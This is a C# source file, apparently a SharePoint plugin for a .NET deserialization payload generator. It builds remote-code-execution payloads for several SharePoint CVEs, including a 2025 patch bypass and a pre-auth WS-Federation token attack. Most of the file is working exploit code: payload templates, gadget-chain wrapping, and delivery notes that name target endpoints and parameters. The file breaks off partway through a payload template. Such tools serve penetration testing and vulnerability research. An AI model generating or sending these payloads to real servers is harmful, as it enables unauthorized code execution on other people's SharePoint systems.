using NDesk.Options;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IdentityModel;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;
using System.Xml;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This plugin generates payloads that can be used for a few SharePoint vulnerabilities that are related to deserialization.
 *  Please feel free to contribute to this and add your name at the top.
 *  It currently supports:
 *      CVE-2020-1147: https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
 *      CVE-2019-0604: https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
 *      CVE-2018-8421: https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/
 *      CVE-2025-49704: https://blog.viettelcybersecurity.com/sharepoint-toolshell/
 *      CVE-2025-53770: patch bypass of CVE-2025-49704 (ToolShell)
 *      CVE-2024-38018: https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ (https://x.com/chudyPB/status/1945420677109936582)
 *      CVE-2026-50522: https://www.zerodayinitiative.com/advisories/ZDI-26-412/ (pre-auth SharePoint WS-Federation trust endpoint; deflate-only SessionSecurityToken cookie, no DPAPI/MachineKey secret needed)
 **/

namespace ysonet.Plugins
{
    public class SharePointPlugin : IPlugin, IPluginModes
    {
        static string cve = "";
        static string gadget = "TypeConfuseDelegate";
        static string command = "";
        static string target = "";
        static bool useurl = false;
        static bool formBody = false; // CVE-2026-50522: emit the full form body vs just the wresult token
        static bool minify = false;
        static bool useSimpleType = true;
        static bool rawcmd = false;
        static bool noComment = false; // suppress the explanatory HTML comment; output only the payload/form body
        static int variant = 1; // Add variant support for CVE-2025-49704

        static OptionSet options = new OptionSet()
            {
                {"cve=", "the CVE reference: CVE-2026-50522, CVE-2025-53770, CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421", v => cve = v },
                {"useurl", "to use the XAML url rather than using the direct command in CVE-2019-0604 and CVE-2018-8421", v => useurl = v != null },
                {"g|gadget=", "a gadget chain for CVE-2020-1147 (LosFormatter) or CVE-2024-38018 / CVE-2026-50522 (BinaryFormatter). Default: TypeConfuseDelegate ", v => gadget = v },
                {"c|command=", "the command to be executed e.g. \"cmd /c calc\" or the XAML url e.g. \"http://b8.ee/x\" to make the payload shorter with the `--useurl` argument", v => command = v },
                {"target=", "for CVE-2026-50522: the absolute SharePoint base URL used as the wctx value. Required with --formbody; on the default token output it only fills the delivery comment's wctx example. It is NOT contacted.", v => target = v },
                {"formbody", "CVE-2026-50522 only: emit the full URL-encoded wa/wctx/wresult form body ready to POST, instead of just the wresult token. Requires --target.", v => formBody = v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Applies to the BinaryFormatter/LosFormatter gadget CVEs. Default: false", v => minify = v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType = v != null },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
                {"no-comment", "Output only the serialized payload or form body, without the trailing explanatory HTML comment.", v => noComment = v != null },
                {"var|variant=", "Variant number for CVE-2025-49704 only. Choices: 1 (default, uses DataSetOldBehaviourGenerator variant 2), 2 (uses DataSetOldBehaviourFromFileGenerator variant 2)", v => int.TryParse(v, out variant) },
            };

        public string Name()
        {
            return "SharePoint";
        }

        public string Description()
        {
            return "Generates payloads for the following SharePoint CVEs: CVE-2026-50522, CVE-2025-53770, CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421";
        }

        public string Credit()
        {
            return "CVE-2024-38018: Piotr Bazydło - explained by Khoa Dinh & implemented by Soroush Dalili, CVE-2025-49704: Khoa Dinh - implemented by Soroush Dalili, CVE-2025-53770: patch bypass of CVE-2025-49704 - implemented by Soroush Dalili, CVE-2026-50522: splitline of DEVCORE Research Team (ZDI-26-412) - implemented by Soroush Dalili, CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        // Interactive-only mode descriptions (see IPluginModes). The mode here is the
        // CVE; each CVE surfaces only its relevant inner setting (a variant, a gadget,
        // or the useurl switch). Each maps to a value of the plugin's own --cve option,
        // so the CLI is unchanged.
        public List<PluginMode> InteractiveModes()
        {
            return new List<PluginMode>
            {
                new PluginMode {
                    Name = "CVE-2025-49704 (ToolShell)",
                    Description = "ToolPane.aspx DataSet gadget; pick a variant.",
                    Options = new string[] { "command", "variant" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "cve", "CVE-2025-49704" } },
                },
                new PluginMode {
                    Name = "CVE-2025-53770 (ToolShell patch bypass)",
                    Description = "CVE-2025-49704 with the patch bypass; pick a variant.",
                    Options = new string[] { "command", "variant" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "cve", "CVE-2025-53770" } },
                },
                new PluginMode {
                    Name = "CVE-2024-38018",
                    Description = "SPObjectStateFormatter webpart; choose a BinaryFormatter gadget.",
                    Options = new string[] { "command", "gadget" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "cve", "CVE-2024-38018" } },
                },
                new PluginMode {
                    Name = "CVE-2020-1147",
                    Description = "DataSet quicklinks gadget; choose a LosFormatter gadget.",
                    Options = new string[] { "command", "gadget" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "cve", "CVE-2020-1147" } },
                },
                new PluginMode {
                    Name = "CVE-2019-0604",
                    Description = "XmlSerializer workflow; command or a XAML url (--useurl).",
                    Options = new string[] { "command", "useurl" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "cve", "CVE-2019-0604" } },
                },
                new PluginMode {
                    Name = "CVE-2018-8421",
                    Description = "Workflow markup; command or a XAML url (--useurl).",
                    Options = new string[] { "command", "useurl" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "cve", "CVE-2018-8421" } },
                },
                new PluginMode {
                    Name = "CVE-2026-50522",
                    Description = "Pre-auth SharePoint WS-Federation trust endpoint; deflate-only token, no DPAPI/MachineKey secret needed. Default output is the wresult token; enable formbody for the full POST body (needs target).",
                    Options = new string[] { "command", "target", "gadget", "formbody" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "cve", "CVE-2026-50522" } },
                },
            };
        }

        public object Run(string[] args)
        {

            // Reset the target static before parsing. Plugin options live in static
            // fields, so an in-process prior run could otherwise leave a target set and
            // hide a missing --target on a later CVE-2026-50522 call. Parsing below
            // fills them back in from this run's args.
            target = "";
            formBody = false;
            minify = false;
            useSimpleType = true;
            rawcmd = false;
            noComment = false;

            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysonet: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception(e.Message);
            }
            string payload = "";

            if (String.IsNullOrEmpty(cve) || String.IsNullOrWhiteSpace(cve) || String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            switch (cve.ToLower())
            {
                case "cve-2018-8421":
                    payload = CVE_2018_8421();
                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                "https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/" +
                                "\r\n-->";

                    break;
                case "cve-2019-0604":
                    payload = CVE_2019_0604();
                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                "https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability" +
                                "\r\n-->";
                    break;
                case "cve-2020-1147":
                    payload = CVE_2020_1147();
                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                "https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html" +
                                "\r\n The payload needs to be sent (POST request) in the __SUGGESTIONSCACHE__ parameter to /_layouts/15/quicklinks.aspx?Mode=Suggestion or /_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion " +
                                "\r\n-->";
                    break;
                case "cve-2024-38018":
                    payload = CVE_2024_38018();
                    if (!noComment) payload += "\r\n\r\n<!--\r\n The payload can be sent to any page supporting webparts such as /_vti_bin/webpartpages.asmx" +
                                "\r\n-->";
                    break;
                case "cve-2025-49704":
                    payload = CVE_2025_49704(false);
                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                "https://blog.viettelcybersecurity.com/sharepoint-toolshell/" +
                                "\r\n The payload needs to be sent in the MSOTlPn_DWP parameter to /_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx" +
                                "\r\n-->";
                    break;
                case "cve-2025-53770":
                    // cve-2025-49704 patch bypass
                    payload = CVE_2025_49704(true);
                    if (!noComment) payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                "https://blog.viettelcybersecurity.com/sharepoint-toolshell/" +
                                "\r\n The payload needs to be sent in the MSOTlPn_DWP parameter to /_layouts/15/ToolPane.aspx/?DisplayMode=Edit&foo=/ToolPane.aspx" +
                                "\r\n-->";
                    break;
                case "cve-2026-50522":
                    // Default output is the wresult token XML plus a delivery comment
                    // (like the other SharePoint modes). With --formbody the output is the
                    // full URL-encoded wa/wctx/wresult body and no comment is appended (it
                    // would corrupt the form body). Both are built inside the method.
                    payload = CVE_2026_50522();
                    break;
            }

            if (String.IsNullOrEmpty(payload))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            return payload;
        }

        public string CVE_2024_38018()
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = command;
            inputArgs.IsRawCmd = rawcmd;
            inputArgs.Minify = minify;
            inputArgs.UseSimpleType = useSimpleType;

            string formatter = "binaryformatter";
            byte[] binaryformatterPayload = new byte[] { };

            // Use GadgetRegistry to validate gadget exists
            if (!GadgetRegistry.GadgetExists(gadget))
            {
                Console.WriteLine("Gadget not supported.");
                throw new Exception("Gadget not supported.");
            }

            // Use GadgetRegistry to create gadget instance
            IGenerator generator = GadgetRegistry.CreateGadgetInstance(gadget);
            if (generator == null)
            {
                Console.WriteLine("Gadget not supported!");
                throw new Exception("Gadget not supported!");
            }

            if (generator.IsSupported(formatter))
            {
                binaryformatterPayload = (byte[])generator.GenerateWithNoTest(formatter, inputArgs);
            }
            else
            {
                Console.WriteLine("BinaryFormatter not supported by the selected gadget.");
                throw new Exception("BinaryFormatter not supported by the selected gadget.");
            }

            // Base paths
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string dllsFolder = Path.Combine(baseDir, "dlls/sharepoint/19/");


            // register a quick assembly‐resolver so LoadFrom() will pick up any *other* DLL
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                // look for the requested DLL by name in our dllsFolder
                string simpleName = new AssemblyName(args.Name).Name + ".dll";
                string candidate = Path.Combine(dllsFolder, simpleName);
                return File.Exists(candidate)
                    ? Assembly.LoadFrom(candidate)
                    : null;
            };


            // --- Load Microsoft.SharePoint.dll ---
            string spPath = Path.Combine(dllsFolder, "Microsoft.SharePoint.dll");
            if (!File.Exists(spPath))
                throw new FileNotFoundException("Microsoft.SharePoint.dll not found", spPath);
            Assembly spAsm = Assembly.LoadFrom(spPath);

            // --- Load Microsoft.SharePoint.ApplicationPages.dll ---
            string appPagesPath = Path.Combine(dllsFolder, "Microsoft.SharePoint.ApplicationPages.dll");
            if (!File.Exists(appPagesPath))
                throw new FileNotFoundException("Microsoft.SharePoint.ApplicationPages.dll not found", appPagesPath);
            Assembly appPagesAsm = Assembly.LoadFrom(appPagesPath);

            // --- Get the formatter type from Microsoft.SharePoint.dll ---
            Type fmtType = spAsm.GetType(
                "Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter",
                throwOnError: true,
                ignoreCase: false);


            // --- Create SPObjectStateFormatter instance ---
            // This is for SharePoint 2019
            // SharePoint 2013 just uses LosFormatter which can be replaced manually in the final payload!
            object spformatter = Activator.CreateInstance(fmtType);

            // --- Find its public Serialize(ArrayList) method ---
            MethodInfo miSerialize = fmtType.GetMethod(
                "Serialize",
                BindingFlags.Instance | BindingFlags.Public,
                binder: null,
                types: new[] { typeof(Object) },
                modifiers: null);
            if (miSerialize == null)
                throw new MissingMethodException(fmtType.FullName, "Serialize");

            //*
            // --- Get the SPThemes type from Microsoft.SharePoint.ApplicationPages.dll ---
            Type spThemesType = appPagesAsm.GetType(
                "Microsoft.SharePoint.ApplicationPages.SPThemes",
                throwOnError: true,
                ignoreCase: false);


            // --- Build your payload: DataSetBinaryMarshal wrapping your binaryformatter data and SPThemes type ---
            var payloadDataSetMarshal = new DataSetBinaryMarshal(binaryformatterPayload);
            payloadDataSetMarshal.SetDerivedType(spThemesType);

            var list = new ArrayList { payloadDataSetMarshal };

            string serializedPayload = (string)miSerialize.Invoke(spformatter, new object[] { payloadDataSetMarshal });

            string final_payload_template = @"<%@ Register Tagprefix=""WebPartPages"" Namespace="" Microsoft.SharePoint.WebPartPages"" Assembly=""Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"" %>

<WebPartPages:XmlWebPart ID=""SPWebPartManager"" runat=""Server"">
    <WebPart
        xmlns=""http://schemas.microsoft.com/WebPart/v2"">
        <AttachedPropertiesShared>{serializedPayload}</AttachedPropertiesShared>
    </WebPart>
</WebPartPages:XmlWebPart>";

            return final_payload_template.Replace("{serializedPayload}", serializedPayload);
        }

        // CVE-2026-50522: pre-auth SharePoint WS-Federation trust endpoint.
        //
        // Reproduces the public PoC path. A BinaryFormatter gadget is wrapped in a
        // SharePoint WS-Federation sign-in token (wresult) and posted to the
        // trusted-provider sign-in page. The cookie is deflate-only (no DPAPI or
        // MachineKey protection), which is what makes this path reachable without a
        // server secret. The SCT Cookie is Base64(Deflate(BinaryFormatter gadget)).
        //
        // Two output shapes:
        //   default    - the wresult token XML plus a delivery comment (like the other
        //                SharePoint modes). The operator posts wa/wctx/wresult; wctx is
        //                transport, so it is not baked into the payload.
        //   --formbody - the complete URL-encoded sign-in form body:
        //                  wa=wsignin1.0&wctx=<base URL>&wresult=<RSTR/SCT XML>
        //                ready to POST as application/x-www-form-urlencoded. Needs --target.
        //
        // POST to /_trust/default.aspx on an explicitly authorized SharePoint target.
        // This method never contacts the URL.
        public string CVE_2026_50522()
        {
            // A provided --target is always validated and normalized: it becomes wctx in
            // the form body, or the wctx example in the default token's delivery comment.
            // It is REQUIRED only with --formbody, and never contacted.
            string normalizedTarget = null;
            if (!String.IsNullOrEmpty(target) && !String.IsNullOrWhiteSpace(target))
            {
                Uri targetUri;
                if (!Uri.TryCreate(target, UriKind.Absolute, out targetUri) ||
                    (targetUri.Scheme != Uri.UriSchemeHttp && targetUri.Scheme != Uri.UriSchemeHttps))
                {
                    Console.WriteLine("--target must be an absolute http or https URL.");
                    throw new Exception("--target must be an absolute http or https URL.");
                }

                if (!String.IsNullOrEmpty(targetUri.UserInfo) ||
                    !String.IsNullOrEmpty(targetUri.Query) ||
                    !String.IsNullOrEmpty(targetUri.Fragment))
                {
                    Console.WriteLine("--target must not contain user info, a query string, or a fragment.");
                    throw new Exception("--target must not contain user info, a query string, or a fragment.");
                }

                // Normalize to a trailing slash so wctx is deterministic.
                normalizedTarget = targetUri.GetLeftPart(UriPartial.Path);
                if (!normalizedTarget.EndsWith("/"))
                    normalizedTarget += "/";
            }

            if (formBody && normalizedTarget == null)
            {
                Console.WriteLine("--target is required with --formbody for CVE-2026-50522 (the SharePoint base URL used as wctx).");
                throw new Exception("--target is required with --formbody for CVE-2026-50522.");
            }

            // Validate the gadget and require BinaryFormatter support.
            if (!GadgetRegistry.GadgetExists(gadget))
            {
                Console.WriteLine("Gadget not supported.");
                throw new Exception("Gadget not supported.");
            }

            IGenerator generator = GadgetRegistry.CreateGadgetInstance(gadget);
            if (generator == null)
            {
                Console.WriteLine("Gadget not supported!");
                throw new Exception("Gadget not supported!");
            }

            if (!generator.IsSupported("BinaryFormatter"))
            {
                Console.WriteLine("BinaryFormatter not supported by the selected gadget.");
                throw new Exception("BinaryFormatter not supported by the selected gadget.");
            }

            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = command;
            inputArgs.IsRawCmd = rawcmd;
            inputArgs.Minify = minify;
            inputArgs.UseSimpleType = useSimpleType;

            byte[] binaryformatterPayload = generator.GenerateWithNoTest("BinaryFormatter", inputArgs) as byte[];
            if (binaryformatterPayload == null || binaryformatterPayload.Length == 0)
            {
                Console.WriteLine("The selected gadget did not produce a BinaryFormatter payload.");
                throw new Exception("The selected gadget did not produce a BinaryFormatter payload.");
            }

            // Deflate-only cookie: no DPAPI/MachineKey protection in this SharePoint path.
            DeflateCookieTransform deflate = new DeflateCookieTransform();
            byte[] deflated = deflate.Encode(binaryformatterPayload);
            string cookieBase64 = Convert.ToBase64String(deflated);

            string tokenIdentifier = "urn:unique-id:securitycontext:" + Guid.NewGuid().ToString("N");
            string wresult = BuildTrustResponse(tokenIdentifier, cookieBase64);

            if (formBody)
            {
                // Full request body: wa, wctx, wresult in a deterministic order, every
                // value URL-encoded. Ready to POST as application/x-www-form-urlencoded.
                StringBuilder body = new StringBuilder();
                body.Append("wa=").Append(System.Web.HttpUtility.UrlEncode("wsignin1.0"));
                body.Append("&wctx=").Append(System.Web.HttpUtility.UrlEncode(normalizedTarget));
                body.Append("&wresult=").Append(System.Web.HttpUtility.UrlEncode(wresult));
                return body.ToString();
            }

            // Default: the wresult token plus a delivery comment, matching the other
            // SharePoint modes. wctx is transport only and stays out of the token; the
            // comment shows how to post it (using --target if given, else a placeholder).
            // --no-comment drops the comment and returns just the token.
            if (noComment)
                return wresult;

            string wctxExample = normalizedTarget ?? "http://YOUR-SHAREPOINT-BASE/";
            string guidance =
                "\r\n\r\n<!--\r\n" +
                "CVE-2026-50522: pre-auth SharePoint WS-Federation trust endpoint (ZDI-26-412).\r\n" +
                "The value above is the wresult token (deflate-only SessionSecurityToken cookie,\r\n" +
                "no DPAPI/MachineKey secret needed).\r\n" +
                "POST it as application/x-www-form-urlencoded to /_trust/default.aspx on an\r\n" +
                "explicitly authorized target, with these fields:\r\n" +
                "  wa=wsignin1.0\r\n" +
                "  wctx=" + wctxExample + "   (transport only; not part of the token)\r\n" +
                "  wresult=<the token above>\r\n" +
                "Tip: add --formbody --target <base URL> to emit the complete URL-encoded body instead.\r\n" +
                "More: https://www.zerodayinitiative.com/advisories/ZDI-26-412/\r\n" +
                "-->";
            return wresult + guidance;
        }

        // Builds the WS-Federation RequestSecurityTokenResponse that carries the
        // SecurityContextToken and the deflate-only cookie. Built with XmlWriter so the
        // Base64 cookie and identifier are properly escaped, never string-interpolated.
        private static string BuildTrustResponse(string tokenIdentifier, string cookieBase64)
        {
            const string nsTrust = "http://schemas.xmlsoap.org/ws/2005/02/trust";
            const string nsSc = "http://schemas.xmlsoap.org/ws/2005/02/sc";
            const string nsSecurity = "http://schemas.microsoft.com/ws/2006/05/security";

            StringBuilder sb = new StringBuilder();
            XmlWriterSettings settings = new XmlWriterSettings
            {
                OmitXmlDeclaration = true,
                ConformanceLevel = ConformanceLevel.Fragment,
                Indent = false,
                Encoding = new UTF8Encoding(false),
            };

            using (XmlWriter xw = XmlWriter.Create(sb, settings))
            {
                xw.WriteStartElement("RequestSecurityTokenResponse", nsTrust);
                xw.WriteStartElement("RequestedSecurityToken", nsTrust);
                xw.WriteStartElement("SecurityContextToken", nsSc);

                xw.WriteStartElement("Identifier", nsSc);
                xw.WriteString(tokenIdentifier);
                xw.WriteEndElement(); // Identifier

                xw.WriteStartElement("Cookie", nsSecurity);
                xw.WriteString(cookieBase64);
                xw.WriteEndElement(); // Cookie

                xw.WriteEndElement(); // SecurityContextToken
                xw.WriteEndElement(); // RequestedSecurityToken
                xw.WriteEndElement(); // RequestSecurityTokenResponse
            }

            return sb.ToString();
        }

        public string CVE_2025_49704(bool useBypass)
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = command;
            inputArgs.IsRawCmd = rawcmd;
            inputArgs.Minify = minify;
            inputArgs.UseSimpleType = useSimpleType;

            string final_payload_template = @"<%@ Register Tagprefix=""ScorecardClient"" Namespace=""Microsoft.PerformancePoint.Scorecards"" Assembly=""Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"" %>

<asp:UpdateProgress ID=""Update"" DisplayAfter=""1"" 
runat=""server"">
<ProgressTemplate>
  <div>            
    <ScorecardClient:ExcelDataSet CompressedDataTable=""{GzipPayload}"" DataTable-CaseSensitive=""false"" runat=""server""/>
  </div>
</ProgressTemplate>
</asp:UpdateProgress>";

            if (useBypass)
            {
                // Adding a trailing space (other whitespaces might also work)
                final_payload_template = final_payload_template.Replace(@"Namespace=""Microsoft.PerformancePoint.Scorecards""", @"Namespace=""Microsoft.PerformancePoint.Scorecards """);

                // Adding a trailing space (other whitespaces might also work), space could also be a prefix
                final_payload_template = final_payload_template.Replace(@"Tagprefix=""ScorecardClient""", @"Tagprefix=""ScorecardClient """);
            }

            byte[] payload_bytes;

            if (variant == 2)
            {
                // Variant 2: Use GadgetRegistry to create DataSetOldBehaviourFromFileGenerator variant 2 (run code)
                IGenerator dsFromFileGenerator = GadgetRegistry.CreateGadgetInstance("DataSetOldBehaviourFromFile");
                if (dsFromFileGenerator == null)
                {
                    Console.WriteLine("DataSetOldBehaviourFromFileGenerator not supported!");
                    throw new Exception("DataSetOldBehaviourFromFileGenerator not supported!");
                }

                inputArgs.ExtraInternalArguments = new List<string> {
                    "-var", "2"
                };

                payload_bytes = (byte[])dsFromFileGenerator.GenerateWithNoTest("binaryformatter", inputArgs);
            }
            else
            {
                // Variant 1 (default): Use GadgetRegistry to create DataSetOldBehaviourGenerator variant 1 (run command)
                IGenerator dsGenerator = GadgetRegistry.CreateGadgetInstance("DataSetOldBehaviour");
                if (dsGenerator == null)
                {
                    Console.WriteLine("DataSetOldBehaviourGenerator not supported!");
                    throw new Exception("DataSetOldBehaviourGenerator not supported!");
                }

                inputArgs.ExtraInternalArguments = new List<string> {
                    "-var", "2"
                };

                payload_bytes = (byte[])dsGenerator.GenerateWithNoTest("binaryformatter", inputArgs);
            }

            byte[] compressedBytes;
            using (var memoryStream = new MemoryStream())
            {
                // leave the memoryStream open after disposing gzipStream so we can read it
                using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true))
                {
                    gzipStream.Write(payload_bytes, 0, payload_bytes.Length);
                }

                // At this point gzipStream is disposed and all data is flushed into memoryStream
                compressedBytes = memoryStream.ToArray();
            }

            string base64Result = Convert.ToBase64String(compressedBytes);

            // minimisation of payload is not important here but we can do it if needed!

            //return final_payload_template.Replace("{GzipPayload}", base64Result).Replace("+", "%2B").Replace("&", "%26"); // POST body safe (minimal url-encoding)
            return final_payload_template.Replace("{GzipPayload}", base64Result);
        }


        public string CVE_2020_1147()
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = command;
            inputArgs.IsRawCmd = rawcmd;
            inputArgs.Minify = minify;
            inputArgs.UseSimpleType = useSimpleType;

            string formatter = "losformatter";
            string losFormatterPayload = "";

            // Use GadgetRegistry to validate gadget exists
            if (!GadgetRegistry.GadgetExists(gadget))
            {
                Console.WriteLine("Gadget not supported.");
                throw new Exception("Gadget not supported.");
            }

            // Use GadgetRegistry to create gadget instance
            IGenerator generator = GadgetRegistry.CreateGadgetInstance(gadget);
            if (generator == null)
            {
                Console.WriteLine("Gadget not supported!");
                throw new Exception("Gadget not supported!");
            }

            // Check Generator supports specified formatter
            if (generator.IsSupported(formatter))
            {
                losFormatterPayload = System.Text.Encoding.ASCII.GetString((byte[])generator.GenerateWithNoTest(formatter, inputArgs));
            }
            else
            {
                Console.WriteLine("LosFormatter not supported.");
                throw new Exception("LosFormatter not supported.");
            }

            string payload = @"<DataSet>
  <xs:schema xmlns="""" xmlns:xs=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" id=""somedataset"">
    <xs:element name=""somedataset"" msdata:IsDataSet=""true"" msdata:UseCurrentLocale=""true"">
      <xs:complexType>
        <xs:choice minOccurs=""0"" maxOccurs=""unbounded"">
          <xs:element name=""Exp_x0020_Table"">
            <xs:complexType>
              <xs:sequence>
                <xs:element name=""pwn"" msdata:DataType=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" type=""xs:anyType"" minOccurs=""0""/>
              </xs:sequence>
            </xs:complexType>
          </xs:element>
        </xs:choice>
      </xs:complexType>
    </xs:element>
  </xs:schema>
  <diffgr:diffgram xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
    <somedataset>
      <Exp_x0020_Table diffgr:id=""Exp Table1"" msdata:rowOrder=""0"" diffgr:hasChanges=""inserted"">
        <pwn xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Deserialize</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">" + losFormatterPayload + @"</anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""LosFormatter""></ObjectInstance>
        </ProjectedProperty0>
        </pwn>
      </Exp_x0020_Table>
    </somedataset>
  </diffgr:diffgram>
</DataSet>";

            // minimisation of payload is not important here but we can do it if needed!

            //return payload.Replace("+","%2B").Replace("&","%26"); // POST body safe (minimal url-encoding)

            return payload;
        }

        public string CVE_2018_8421()
        {

            string payload = "";

            if (useurl)
            {
                payload = @"<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Body><ValidateWorkflowMarkupAndCreateSupportObjects xmlns=""http://microsoft.com/sharepoint/webpartpages""><workflowMarkupText><![CDATA[
<SequentialWorkflowActivity x:Class=""."" x:Name=""Workflow2"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/workflow"">
<Rd:ResourceDictionary xmlns:Rd=""clr-namespace:System.Windows;Assembly=PresentationFramework,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" Source=""" + command + @"""/>
</SequentialWorkflowActivity>
]]></workflowMarkupText>
<rulesText></rulesText><configBlob></configBlob><flag>2</flag></ValidateWorkflowMarkupAndCreateSupportObjects></soap:Body></soap:Envelope>";

            }
            else
            {
                Boolean hasArgs;
                string[] splittedCMD = CommandArgSplitter.SplitCommand(command, CommandArgSplitter.CommandType.XML, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = $@"<Diag:ProcessStartInfo FileName=""" + splittedCMD[0] + @""" Arguments=""" + splittedCMD[1] + @""">";
                }
                else
                {
                    cmdPart = $@"<Diag:ProcessStartInfo FileName=""" + splittedCMD[0] + @""">";
                }

                payload = @"<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Body><ValidateWorkflowMarkupAndCreateSupportObjects xmlns=""http://microsoft.com/sharepoint/webpartpages""><workflowMarkupText><![CDATA[
<SequentialWorkflowActivity x:Class=""."" x:Name=""Workflow2"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/workflow"">
<Rd:ResourceDictionary xmlns:System=""clr-namespace:System;assembly=mscorlib, Version=4.0.0.0,    
Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=System,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:Rd=""clr-namespace:System.Windows;Assembly=PresentationFramework,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" xmlns:ODP=""clr-namespace:System.Windows.Data;Assembly=PresentationFramework, Version=4.0.0.0, Culture=neutral,    
